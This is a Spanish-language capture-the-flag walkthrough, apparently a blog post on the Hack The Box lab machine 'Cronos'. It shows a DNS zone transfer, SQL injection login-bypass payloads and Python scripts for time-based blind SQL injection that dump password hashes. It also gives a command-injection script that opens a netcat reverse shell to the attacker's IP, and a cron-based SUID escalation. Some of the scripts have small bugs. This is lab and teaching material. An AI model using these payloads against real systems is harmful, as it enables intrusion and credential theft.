---
layout: post
title: HTB_Cronos
date: 2023/07/10
slug: HTB_Cronos
heroImage: /assets/machines.jpg
---

# Cronos {-}

## Introduccion {-}

La maquina del dia 19/08/2021 se llama Cronos.

El replay del live se puede ver aqui

[![S4vitaar Cronos maquina](https://img.youtube.com/vi/E_w8hWAWwTI/0.jpg)](https://www.youtube.com/watch?v=E_w8hWAWwTI)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.13
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.13
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.13 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,53,80 10.10.10.13 -oN targeted
```


| Puerto | Servicio | Que se nos occure?                     | Que falta?            |
| ------ | -------- | -------------------------------------- | --------------------- |
| 22     | ssh      | Conneccion directa                     | usuario y contraseña  |
| 53     | Domain   | AXFR - Ataque de transferencia de zona | Conocer algun dominio |
| 80     | http     | Web, Fuzzing                           |                       |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.13
```

Nada interesante aqui

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.143 -oN webScan
```

Vemos que hay un 
```bash
 /phpmyadmin 
```


#### Analyzando la web con Firefox {-}

Es la pagina Apache2 por defecto

### Analyzando los dominios {-}

Como el puerto 53 esta abierto vamos a ver si podemos recuperar dominios con **nslookup**

```bash
nslookup

>server 10.10.10.13
>10.10.10.13
13.10.10.10.in-addr.arpa    name = ns1.cronos.htb
```

Vemos un dominio 
```bash
 cronos.htb 
```
 y lo añadimos a nuestro 
```bash
 /etc/hosts 
```


Si lanzamos Firefox con la url 
```bash
 http://cronos.htb 
```
 vemos una pagina differente de la pagina apache2 por defecto, lo que
significa que estamos en frente de un **virtualhost**

Vamos a intentar hacer ataques de transferencia de zona
## Vulnerability Assessment {-}

### AXFR {-}

```bash
dig @10.10.10.13 cronos.htb ns
dig @10.10.10.13 cronos.htb mx
dig @10.10.10.13 cronos.htb axfr
```

Aqui vemos que es vulnerable a ataques **AXFR** y vemos otro dominio 
```bash
 admin.cronos.htb 
```
 que añadimos al 
```bash
 /etc/hosts 
```
.

Si visitamos esta nueva web con Firefox vemos un panel de inicio de session.

### SQL Injection {-}

En el UserName si le ponemos la injeccion SQL basica 
```bash
 ' or 1=1-- - 
```
 y le damos a submit, entramos directamente en el panel
de administracion.

Como sabemos que esta vulnerable a injeccion SQL, probamos differentes cosas porque lo que nos interesa es tener usuarios y contrañas.

```bash
' order by 100-- -
' or sleep(5)-- -
```

Vemos que no esta vulnerable a un **Error Based SQL Injection** pero lo es a un **Time Based SQL Injection**.

```bash
admin' or sleep(5)-- -
admin' and sleep(5)-- -
```

Con estos commandos, comprobamos que el usuario admin existe.

Creamos un script en python para encontrar las informaciones con un **Time Based SQL Injection**

#### Time Based SQL Injection Autopwn {-}

Buscamos en nombre de la database

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Database")

    database = ""

    
    for position in range(1, 10):
        for character in s:
            p1.status("Probando con el caracter %c en la posicion %d" % (character, position))
            post_data = {
                'username': "admin' and if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (position, character),
                'password': 'admin'
            }

            time_start = time.time()
            r = requests.post(login_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 5:
                password += character
                p2.status(database)
                break

if __name__ == '__main__':

    makeRequest()
```

Aqui vemos que la base de datos se llama 
```bash
 admin 
```
. Buscamos ahora el nombre de la tabla.

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Table")

    table_name = ""

    for table in range(0,4):
        for position in range(1, 10):
            for character in s:
                p1.status("Probando con el caracter %c en la posicion %d de la tabla numero " % (character, position, table))
                post_data = {
                    'username': "admin' and if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (table, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    table_name += character
                    p2.status(table_name)
                    break
            break
        table_name += " - "

if __name__ == '__main__':

    makeRequest()
```

Ahora que sabemos que hay una tabla 
```bash
 users 
```
, miramos las columnas.

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Columns")

    column_name = ""

    for column in range(0,4):
        for position in range(1, 10):
            for character in s:
                p1.status("Probando con el caracter %c en la posicion %d de la columna numero %d de la tabla users " % (character, position, column))
                post_data = {
                    'username': "admin' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (column, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    column_name += character
                    p2.status(column_name)
                    break
            break
        table_name += " - "

if __name__ == '__main__':

    makeRequest()
```

Ahora conocemos las columnas, vamos a por las data.

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Password")

    password = ""

    for user in range(0, 4):
        for position in range(1, 50):
            for character in s:
                p1.status("Posicion numero %d de la extraccion de password del usuario admin | Caracter %c" % (position, character))
                post_data = {
                    'username': "admin' and if(substr((select password from users limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (user, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    password += character
                    p2.status(password)

if __name__ == '__main__':

    makeRequest()
```

Aqui vemos que es un hash MD5 y passamos por rainbow tables para crackear la contraseña.

#### Utilizando la web {-}

La pagina web permite enviar ping a maquinas. Lo intentamos contra nuestra maquina de atacante.

1. En la maquina de atacante

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. Lanzamos por la web un ping a la 10.10.14.7

Y recibimos la traza.

Miramos si la web esta bien sanitizada mirando si poniendole 
```bash
 10.10.14.7; whoami 
```
 no salimos del contexto y es el caso.
Vamos a ganar accesso al systema.
## Vuln exploit & Gaining Access {-}

### Autopwn {-}

```python
#!/usr/bin/python3

import requests
import pdb
import signal
import threading

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://admin.cronos.htb/index.php"
shell_url = "http://admin.cronos.htb/welcome.php"
lport = 443

def makeRequest():

    s = requests.session()

    post_data = {
        'username': 'admin',
        'password': '1327663704'
    }

    r = s.post(login_url, data=post_data)

    post_data = {
        'command': 'ping -c 1',
        'host': '10.10.14.7; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 443 >/tmp/f'
    }

    r = s.post(shell_url, data=post_data)

if __name__ == '__main__':
    
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
```

Si lanzamos en script ganamos accesso al systema.

```bash
whoami

www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Tenemos que ver si tenemos que hacer un user pivoting pero como ya tenemos accesso a la flag, no es necessario.
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
uname -a
lsb_release -a
find \-perm -4000 2>/dev/null
```

Aqui no hay nada interesante, vamos a enumerar el systema por tareas cron

```bash
cd /dev/shm
ls
touch procmon.sh
chmod +x procmon.sh
nano procmon.sh
```

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
    old_process=$new_process
done
```

Y lo ejecutamos. Vemos que hay una tarea que ejecuta un script llamado artisan en **php**. Haciendole un 
```bash
 ls -l 
```
 nos damos cuenta que
el proprietario del script es **www-data**. Imaginamos que el que lanza el script es root. vamos a modificar el script.

```php
<?php
    system("chmod 4755 /bin/bash");
?>
```

Esperamos que la tarea se ejecute con 
```bash
 watch -n 1 ls -l /bin/bash 
```
 y pasa a ser SUID

```bash
bash -p
whoami

root
```

